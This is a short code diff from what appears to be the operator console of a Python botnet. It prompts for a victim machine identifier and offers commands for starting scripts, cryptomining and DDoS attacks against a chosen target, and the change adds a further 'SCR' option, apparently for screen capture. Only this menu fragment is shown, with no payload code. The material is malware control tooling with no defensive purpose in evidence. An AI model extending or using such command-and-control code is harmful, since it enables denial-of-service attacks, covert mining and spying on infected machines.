@@ -19,7 +19,7 @@ if os.path.exists(file_to_delete):
 
 while True:
     mac = input("Enter Mac: ")
-    option = input("(START/STOP/STARTVBSBAT/MINING/DDOS) : ")
+    option = input("(START/STOP/STARTVBSBAT/MINING/DDOS/SCR) : ")
 
     if option == "DDOS":
         target = input("Target >>> : ")
